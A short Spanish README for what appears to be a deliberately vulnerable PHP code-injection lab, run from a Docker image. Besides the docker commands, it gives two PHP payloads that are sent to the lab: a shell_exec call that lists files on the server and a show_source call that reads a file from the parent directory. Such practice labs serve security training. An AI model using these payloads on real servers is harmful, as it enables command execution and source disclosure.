# Code Injection

Descargar y Montar el servidor desde Docker:

```bash
docker pull ghcr.io/ingenieroricardo/codeinjection:latest
docker run --publish 8080:80 ghcr.io/ingenieroricardo/codeinjection:latest
```

<hr>

Al no tener validaciones se pueden enviar PHP que se pueden ejecutar como esto:

Conocer los archivos en el servidor
```php
<?php
  $salida = shell_exec("cd .. && ls");
  echo "<pre>$salida</pre>";
?>
```
Ver codigo fuente
```php
<?php
  show_source("../archivos.php");
?>
```
